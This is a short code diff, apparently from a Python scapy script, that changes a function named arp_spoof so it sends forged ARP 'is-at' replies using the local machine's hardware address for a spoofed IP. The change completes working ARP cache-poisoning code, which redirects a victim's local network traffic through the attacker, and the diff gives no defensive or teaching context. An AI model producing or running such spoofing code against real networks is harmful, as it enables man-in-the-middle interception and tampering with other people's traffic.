@@ -4,7 +4,7 @@ from scapy.all import *
 import sys
 
 def arp_spoof(dest_ip, dest_mac, source_ip):
-    packet = ARP(op="who-has", psrc = source_ip,
+    packet = ARP(op="is-at", hwsrc=get_if_hwaddr(conf.iface), psrc = source_ip,
             hwdst = dest_mac, pdst = dest_ip)
     send(packet, verbose = False)
 
